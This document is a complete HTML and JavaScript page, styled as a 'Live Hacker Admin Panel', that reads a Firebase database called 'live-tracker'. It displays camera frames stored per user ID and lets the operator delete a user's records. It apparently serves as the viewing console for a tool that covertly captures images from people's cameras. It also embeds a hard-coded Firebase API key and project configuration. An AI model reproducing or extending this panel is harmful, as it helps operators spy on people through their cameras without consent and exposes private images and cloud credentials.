<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hacker Admin Panel</title>

<style>
body{
  margin:0;
  font-family:monospace;
  background:#05070f;
  color:#00ff9d;
}

/* HEADER */
header{
  padding:15px;
  text-align:center;
  font-size:18px;
  border-bottom:1px solid #00ff9d33;
}

/* MAIN GRID */
.container{
  display:flex;
  flex-direction:column;
  gap:15px;
  padding:15px;
}

/* USER BOX */
.userBox{
  border:1px solid #00ff9d33;
  border-radius:12px;
  padding:12px;
  background:#0b0f1a;
  box-shadow:0 0 10px #00ff9d22;
}

/* TIMELINE */
.timeline{
  margin-top:10px;
  max-height:420px;
  overflow-y:auto;
  display:flex;
  flex-direction:column;
  gap:10px;
  padding-right:5px;
}

/* IMAGE STYLE */
.timeline img{
  width:100%;
  border-radius:8px;
  border:1px solid #00ff9d33;
  transition:0.2s;
}

.timeline img:hover{
  transform:scale(1.02);
}

/* BUTTON */
button{
  margin-top:8px;
  padding:8px 12px;
  background:transparent;
  border:1px solid #00ff9d55;
  color:#00ff9d;
  cursor:pointer;
  border-radius:8px;
}

button:hover{
  box-shadow:0 0 10px #00ff9d55;
}
</style>
</head>

<body>

<header>💀 LIVE HACKER ADMIN PANEL</header>

<div class="container" id="grid"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>

const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57O8ALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const grid = document.getElementById("grid");

/* LOAD USERS */
db.ref("camera").on("value",(snap)=>{

  const data = snap.val();
  grid.innerHTML="";

  if(!data){
    grid.innerHTML="<p>No Users Found</p>";
    return;
  }

  Object.keys(data).forEach(userId=>{

    const box=document.createElement("div");
    box.className="userBox";

    box.innerHTML=`
      <h3>👤 ${userId}</h3>

      <button onclick="deleteUser('${userId}')">
        🗑 DELETE ALL
      </button>

      <div class="timeline" id="list_${userId}">
        loading...
      </div>
    `;

    grid.appendChild(box);

    loadTimeline(userId);

  });

});

/* LOAD TIMELINE */
function loadTimeline(userId){

  const ref=db.ref("camera/"+userId);

  ref.on("value",(snap)=>{

    const data=snap.val();
    const box=document.getElementById("list_"+userId);

    box.innerHTML="";

    if(!data){
      box.innerHTML="<p>No images</p>";
      return;
    }

    // latest first
    Object.values(data).reverse().forEach(item=>{

      const img=document.createElement("img");
      img.src=item.frame || "";

      img.onerror=()=>{
        img.src="https://via.placeholder.com/400x300?text=Error";
      };

      box.appendChild(img);

    });

  });

}

/* DELETE USER */
function deleteUser(userId){

  if(confirm("Delete ALL data of "+userId+" ?")){

    db.ref("camera/"+userId).remove()
    .then(()=>alert("Deleted"))
    .catch(err=>alert(err.message));

  }

}

</script>

</body>
</html>
